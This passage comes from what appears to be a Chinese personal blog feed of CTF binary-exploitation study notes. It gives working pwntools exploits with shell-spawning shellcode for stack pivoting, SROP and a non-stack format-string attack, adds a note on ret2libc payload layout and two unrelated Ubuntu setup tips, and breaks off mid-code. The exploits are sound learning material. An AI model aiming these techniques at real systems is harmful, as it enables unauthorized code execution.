pivoting</p><p>思路：往栈上写shellcode，再劫持esp到shellcode处</p><p>栈变化如下，其中padding为填充的垃圾数据<br>fgets读入数据后<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-08-05%20174600.png" alt="1"><br>leave ret后，pop eip<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-08-05%20174739.png" alt="1"><br>eip执行jmp esp后<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-08-05%20174816.png" alt="1"><br>eip执行sub esp, 0x28;jmp esp后<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-08-05%20174840.png" alt="1"></p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./b0verfl0w&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode_x86=asm(<span class="string">&quot;xor ecx, ecx;mul ecx&quot;</span>)</span><br><span class="line">shellcode_x86+=asm(<span class="string">&quot;push ecx;push 0x68732f2f&quot;</span>)  <span class="comment">#ecx--&gt;0</span></span><br><span class="line">shellcode_x86+=asm(<span class="string">&quot;push 0x6e69622f;mov ebx, esp&quot;</span>) <span class="comment">##两个0x 是binsh  ebx--&gt;binhsh</span></span><br><span class="line">shellcode_x86+=asm(<span class="string">&quot;mov al, 0xb;int 0x80&quot;</span>) <span class="comment"># eax--&gt; 0xb</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># shellcode_x86=asm(&quot;xor ecx, ecx;mul ecx;push ecx;push 0x68732f2f;push 0x6e69622f;mov ebx, esp;mov al, 0xb;int 0x80&quot;)</span></span><br><span class="line"></span><br><span class="line">sub_esp_jmp = asm(<span class="string">&#x27;sub esp, 0x28;jmp esp&#x27;</span>)</span><br><span class="line">jmp_esp = <span class="number">0x08048504</span></span><br><span class="line">payload = shellcode_x86 + (<span class="number">0x20</span> - <span class="built_in">len</span>(shellcode_x86)) * <span class="string">&#x27;b&#x27;</span> + <span class="string">&#x27;bbbb&#x27;</span> + p32(jmp_esp) + sub_esp_jmp</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Stack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 栈翻转 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SROP</title>
      <link href="/2024/08/04/srop/"/>
      <url>/2024/08/04/srop/</url>
      
        <content type="html"><![CDATA[<p><em>仅供个人学习参考</em>  </p><span id="more"></span><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>signal 机制是类 unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。比如说，进程之间可以通过系统调用 kill 来发送软中断信号。一般来说，信号机制常见的步骤如下图所示：<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-08-04%20190022.png" alt="1"></p><p>1.内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。<br>2.内核会为该进程保存相应的上下文，主要是将所有<strong>寄存器</strong>压入栈中，以及压入 signal 信息，以及指向 sigreturn 的系统调用地址。此时栈的结构如下图所示，我们称 ucontext 以及 siginfo 这一段为 Signal Frame。需要注意的是，这一部分是在<strong>用户进程的地址空间</strong>的。之后会跳转到注册过的 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 sigreturn 代码。<br>3.signal handler 返回后，内核为执行 sigreturn 系统调用，为该进程恢复之前保存的上下文，其中包括将所有压入的寄存器，<strong>重新 pop 回对应的寄存器</strong>，最后恢复进程的执行。其中，32 位的 sigreturn 的调用号为 **119(0x77)**，64 位的系统调用号为 <strong>15(0xf)</strong><br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-08-04%20190850.png" alt="1"></p><p>发现，Signal Frame可控制寄存器的值；Signal Frame 被保存在用户的地址空间中，所以用户是可以读写的。且内核与信号处理程序无关 (kernel agnostic about signal handlers)，它并不会去记录这个 signal 对应的 Signal Frame，所以当执行 sigreturn 系统调用时，此时的 Signal Frame 并不一定是之前内核为用户进程保存的 Signal Frame。（内核不做检查）<br>64位下Signal Frame如图：<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-08-04%20191551.png" alt="1"></p><p>总结一下利用方式及所需条件：<br>1.存在栈溢出且溢出后可供写入的内存足够大<br>2.需要知道signal frame， sigreturn ， binsh ，  syscall 的地址<br>3.栈溢出后利用rop链完成攻击</p><p>构造system call chains方式如下图所示<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-08-04%20202741.png" alt="1"><br>1.控制栈指针。<br>2.把原来 rip 指向的syscall gadget 换成syscall; ret gadget。</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>360 春秋杯 smallest-pwn <a href="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/smallest">https://raw.githubusercontent.com/GNchen1/Pages/main/Img/smallest</a></p><p>查看保护<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-08-04%20193335.png" alt="1"><br>ida查看伪代码,发现没什么东西<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-08-04%20192852.png" alt="1"><br>ida查看汇编<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-08-04%20192925.png" alt="1"><br>可以看出这是一个对read函数的系统调用，相当于read(0,rsp,0x400),没有别的函数了，写入数据过大，有栈溢出机会，考虑srop</p><p>经过gdb调试，发现程序会ret到我们输入的地址上</p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;DEBUG&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./smallest&quot;</span>)</span><br><span class="line">start_addr = <span class="number">0x00000000004000B0</span></span><br><span class="line">syscall_addr = <span class="number">0x00000000004000BE</span></span><br><span class="line"></span><br><span class="line">payload = p64(start_addr) * <span class="number">3</span>  <span class="comment">#第一次read，实现循环执行系统调用</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.send(<span class="string">&#x27;\xB3&#x27;</span>)        <span class="comment">#第二次read 两个作用，一个是使得rax = 1，从而调用write函数，因为只发送了一个字节，另一个是修改第二次的start地址为0x004000B3(即跳过了xor rax, rax)，同样是为了调用write函数</span></span><br><span class="line">io.recv(<span class="number">8</span>) <span class="comment">#除去第三个start_addr，以便正确接收新的栈地址（接下来要写入的）</span></span><br><span class="line">stack_addr = u64(io.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;stack_addr = &quot;</span> +<span class="built_in">hex</span>(stack_addr)) <span class="comment">#接收新的栈地址(write打印出的)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#开始构造signal frame</span></span><br><span class="line"></span><br><span class="line">frame =  SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_read</span><br><span class="line">frame.rdi = <span class="number">0</span></span><br><span class="line">frame.rsi = stack_addr</span><br><span class="line">frame.rdx = <span class="number">0x400</span></span><br><span class="line">frame.rsp = stack_addr</span><br><span class="line">frame.rip = syscall_addr  <span class="comment">#和rsi保持一致，确保函数写的时候rsp指向stack_addr</span></span><br><span class="line"><span class="comment"># read(0, stack_addr, 0x400)</span></span><br><span class="line"></span><br><span class="line">payload = p64(start_addr) + p64(<span class="number">0</span>) + <span class="built_in">bytes</span>(frame)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">payload = p64(syscall_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">15</span>, <span class="string">b&quot;\x00&quot;</span>)    <span class="comment"># rax = 15</span></span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="comment"># start sigreturn</span></span><br><span class="line"></span><br><span class="line">frame =  SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = stack_addr + <span class="number">0x150</span>        <span class="comment"># binsh的地址</span></span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rsp = stack_addr</span><br><span class="line">frame.rip = syscall_addr</span><br><span class="line"></span><br><span class="line">payload = p64(start_addr) + p64(<span class="number">0</span>) + <span class="built_in">bytes</span>(frame)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload)) <span class="comment">#确定binsh地址,放在这个payload后面就行，这个payload长度为264 bytes，即0x108 bytes,比这个大一些就行</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x150</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">payload = p64(syscall_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">15</span>, <span class="string">b&quot;\x00&quot;</span>)    <span class="comment"># rax = 15</span></span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="comment"># start sigreturn</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Stack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SROP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于payload中栈的布置</title>
      <link href="/2024/08/04/%E5%85%B3%E4%BA%8Epayload%E4%B8%AD%E6%A0%88%E7%9A%84%E5%B8%83%E7%BD%AE/"/>
      <url>/2024/08/04/%E5%85%B3%E4%BA%8Epayload%E4%B8%AD%E6%A0%88%E7%9A%84%E5%B8%83%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<p><em>仅供个人学习参考</em>  </p><span id="more"></span><p>以ret2libc为利，我们在构造payload的时候有两种方式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>+p32(system_addr)+p32(binsh_addr)</span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>+p32(system_plt_addr)+p32(<span class="number">0xdeadbeef</span>)+p32(binsh_addr)</span><br></pre></td></tr></table></figure><p>这两种都可以打通，区别在于：<br>payload1中，system_addr指的是text段上的 call system的地址，如下图所示<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-08-04%20103655.png" alt="1"></p><p>payload2中，system_plt_addr指的是plt表上的system的地址，如下图所示<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-08-04%20104254.png" alt="1"></p><p>首先，我们要执行的system(“&#x2F;bin&#x2F;sh”)，在汇编层面上长这样</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lea eax, [address_binsh_str]</span><br><span class="line">push eax</span><br><span class="line">call system</span><br></pre></td></tr></table></figure><p>call system可以进一步分解为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push ip     <span class="comment">#执行system_addr之后的返回地址</span></span><br><span class="line">jmp system_addr</span><br></pre></td></tr></table></figure><p>所以直接调用plt system，需要先填入返回地址（覆盖ip）</p><p>而直接去调用call system 时，系统会先将下一条指令的地址（即紧跟在 call 指令后的指令地址）压入栈，然后跳转到system处开始执行。当system中的 ret 指令执行时，会从栈中弹出返回地址，并跳转到该地址继续执行主程序,也就是说系统自动帮我们填好了返回地址，不需要我们手动填入</p><p>payload1直接跳转到call system ，则不需要考虑填入返回地址，因为 跳过了push eax，而payload2是直接调用system函数，所以需要填入返回地址（由0xdeadbeef填充）</p>]]></content>
      
      
      <categories>
          
          <category> Stack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> payload </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决Ubuntu1804域名解析失败问题</title>
      <link href="/2024/07/31/%E8%A7%A3%E5%86%B3Ubuntu1804%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98/"/>
      <url>/2024/07/31/%E8%A7%A3%E5%86%B3Ubuntu1804%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p><em>仅供个人学习参考</em>  </p><span id="more"></span><p>最近用Ubuntu18打靶机时发现remote不上，显示无法解析域名，检查&#x2F;etc&#x2F;resolv.conf，发现之前修改的nameserver总是会被修改为127.0.0.53</p><p>解决方法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> su</span><br><span class="line">vim /etc/systemd/resolved.conf</span><br></pre></td></tr></table></figure><p>内容大致如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[Resolve]</span><br><span class="line"><span class="comment">#DNS=</span></span><br><span class="line"><span class="comment">#FallbackDNS=</span></span><br><span class="line"><span class="comment">#Domains=</span></span><br><span class="line"><span class="comment">#LLMNR=no</span></span><br><span class="line"><span class="comment">#MulticastDNS=no</span></span><br><span class="line"><span class="comment">#DNSSEC=no</span></span><br><span class="line"><span class="comment">#Cache=yes</span></span><br><span class="line"><span class="comment">#DNSStubListener=yes</span></span><br></pre></td></tr></table></figure><p>改成</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">DNS=8.8.8.8 8.8.4.4</span><br><span class="line"><span class="comment">#FallbackDNS=</span></span><br><span class="line"><span class="comment">#Domains=</span></span><br><span class="line">LLMNR=no</span><br><span class="line"><span class="comment">#MulticastDNS=no</span></span><br><span class="line"><span class="comment">#DNSSEC=no</span></span><br><span class="line"><span class="comment">#Cache=yes</span></span><br><span class="line"><span class="comment">#DNSStubListener=yes</span></span><br></pre></td></tr></table></figure><p>然后重启systemd-resolved服务即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl restart systemd-resolved</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>非栈上格式化字符串漏洞</title>
      <link href="/2024/07/30/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/"/>
      <url>/2024/07/30/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p><em>仅供个人学习参考</em>  </p><span id="more"></span><p>对于非栈上的格式化字符串漏洞，我们无法往栈上填入指针（指向目标地址的指针）来实现任意写，所以我们采取新的方式：利用指针链<br>首先要在栈上寻找像a-b-c这样的指针链（a,b,c均在栈上），然后我们便能利用%n（%hn，%hhn）来修改<br>假设offset表示格式化的参数位置。通过第offset0个参数，利用%hhn可以控制address1的最低位，再通过第offset1个参数，利用%hhn可以写address2的最低位；然后通过offset0参数，利用%hhn修改address1的最低位为原始值+1，再通过offset1参数，利用%hhn可以写address2的次低位；依次循环即可完全控制address2的值，再次利用address1和address2的链式结构，即可实现对address2地址空间的任意写。</p><p>“%{}c%{}$hhn”.format(address,offset)就是向offset参数指向的地址最低位写成address。</p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">&quot;./playfmt&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./playfmt&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">gdb.attach(io,<span class="string">&quot;b *0x0804855F&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line"><span class="comment">#泄露地址</span></span><br><span class="line">payload=<span class="string">&quot;%6$p%8$p&quot;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">stack_real_addr=<span class="built_in">int</span>(io.recv(<span class="number">8</span>),<span class="number">16</span>)-<span class="number">0xffffd048</span>+<span class="number">0xffffd020</span></span><br><span class="line">success(<span class="string">&quot;stack_real_addr:&quot;</span>+<span class="built_in">hex</span>(stack_real_addr))</span><br><span class="line">io.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">_IO_2_1_stdout_real=<span class="built_in">int</span>(io.recv(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line">libc_addr=_IO_2_1_stdout_real-libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc_addr:&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">## 利用指针链修改地址</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_address</span>(<span class="params">off0,off1,target_addr</span>):</span><br><span class="line">    io.sendline(<span class="string">&quot;%&#123;&#125;$p&quot;</span>.<span class="built_in">format</span>(off1))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">    addr1 = <span class="built_in">int</span>(io.recv(<span class="number">8</span>),<span class="number">16</span>)&amp;<span class="number">0xff</span></span><br><span class="line">    io.recv()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        io.sendline(<span class="string">&quot;%&#123;&#125;c%&#123;&#125;$hhn&quot;</span>.<span class="built_in">format</span>(addr1+i,off0))</span><br><span class="line">        io.recv()</span><br><span class="line">        io.sendline(<span class="string">&quot;%&#123;&#125;c%&#123;&#125;$hhn&quot;</span>.<span class="built_in">format</span>(target_addr&amp;<span class="number">0xff</span>,off1))</span><br><span class="line">        io.recv()        </span><br><span class="line">        target_addr=target_addr&gt;&gt;<span class="number">8</span></span><br><span class="line">    io.sendline(<span class="string">&quot;%&#123;&#125;c%&#123;&#125;$hhn&quot;</span>.<span class="built_in">format</span>(addr1,off0))</span><br><span class="line">    io.recv()</span><br><span class="line"></span><br><span class="line">one_gadget=libc_addr+<span class="number">0x67ccf</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(one_gadget))</span><br><span class="line">offset0=<span class="number">6</span></span><br><span class="line">offset1=<span class="number">10</span></span><br><span class="line">offset2=<span class="number">14</span></span><br><span class="line"></span><br><span class="line">write_address(offset0,offset1,stack_real_addr+<span class="number">0x1c</span>) <span class="comment">#stack_real_addr+0x1c为retaddr</span></span><br><span class="line">pause()</span><br><span class="line">write_address(offset1,offset2,one_gadget)</span><br><span class="line">pause()</span><br><span class="line">io.sendline(<span class="string">&quot;quit&quot;</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>初始指针链为a-b-c-others    ret-play<br>第一次调用write函数后栈上情况：<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-31%20105554.png" alt="1"><br>指针链变成a-b-c-ret-play</p><p>第二次调用write函数后栈上情况：<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-31%20105732.png" alt="1"><br>指针链变成a-b-c-ret-one_gadget   ret-one_gadget</p><p>换个视角看是这样↓</p><p>调用write前<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-31%20121338.png" alt="1"></p><p>第一次调用write后<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-31%20121212.png" alt="1"></p><p>第二次调用write后<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-31%20121430.png" alt="1"></p><p>以上利用需要有循环触发格式化字符串漏洞的条件，并且栈上存在指针链，并且在这个过程中栈结构不被破坏</p>]]></content>
      
      
      <categories>
          
          <category> Stack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 格式化字符串漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决gem下载速度过慢或者无反应</title>
      <link href="/2024/07/29/%E8%A7%A3%E5%86%B3gem%E4%B8%8B%E8%BD%BD%E9%80%9F%E5%BA%A6%E8%BF%87%E6%85%A2%E6%88%96%E8%80%85%E6%97%A0%E5%8F%8D%E5%BA%94/"/>
      <url>/2024/07/29/%E8%A7%A3%E5%86%B3gem%E4%B8%8B%E8%BD%BD%E9%80%9F%E5%BA%A6%E8%BF%87%E6%85%A2%E6%88%96%E8%80%85%E6%97%A0%E5%8F%8D%E5%BA%94/</url>
      
        <content type="html"><![CDATA[<p><em>仅供个人学习参考</em>  </p><span id="more"></span><p><a href="https://mirrors.tuna.tsinghua.edu.cn/help/rubygems/">https://mirrors.tuna.tsinghua.edu.cn/help/rubygems/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
            <tag> gem </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ret2libc3(但是有坑)</title>
      <link href="/2024/07/28/ret2libc3(%E4%BD%86%E6%98%AF%E6%9C%89%E5%9D%91)/"/>
      <url>/2024/07/28/ret2libc3(%E4%BD%86%E6%98%AF%E6%9C%89%E5%9D%91)/</url>
      
        <content type="html"><![CDATA[<p><em>仅供个人学习参考</em>  </p><span id="more"></span><p>题目：<a href="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/pwn">https://raw.githubusercontent.com/GNchen1/Pages/main/Img/pwn</a></p><p>checksec<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-27%20234716.png" alt="1"><br>ida查看，有栈溢出<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-27%20234938.png" alt="1"><br>有个gift函数，这个有大用处<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-27%20234950.png" alt="1"></p><p>这题会发现按正常ret2libc3来打，会打不通</p><p>问题出在init<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-27%20235208.png" alt="1"><br>init函数里面，stdout设置成了全缓冲模式，这种情况下，只有缓冲区满了或者调用fflush才会输出，所以要在调用puts输出libc地址后再调用fflush，然后才能接受到地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">setvbuf</span><span class="params">(FILE *stream, <span class="type">char</span> *buf, <span class="type">int</span> mode, <span class="type">size_t</span> size)</span>;</span><br></pre></td></tr></table></figure><p>stream: 是一个指向 FILE 结构体的指针，表示要设置缓冲方式的流，比如 stdin, stdout, stderr 等。<br>buf: 是一个指向用于存储数据的缓冲区的指针。根据不同的值，它可以是一个已分配的缓冲区的指针，也可以是 NULL 来禁用缓冲。<br>mode: 表示缓冲模式，可以取以下值:<br>_IOFBF：<strong>完全缓冲</strong>（Full buffering），数据在填满缓冲区或者调用 fflush 函数时才会写入文件,对应的数字是 <strong>0</strong>。<br>_IOLBF：<strong>行缓冲</strong>（Line buffering），数据在换行符 \n 出现时写入文件,对应的数字是 <strong>1</strong>。<br>_IONBF：<strong>无缓冲</strong>（No buffering），数据立即写入文件，没有缓冲,对应的数字是 <strong>2</strong>。</p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span 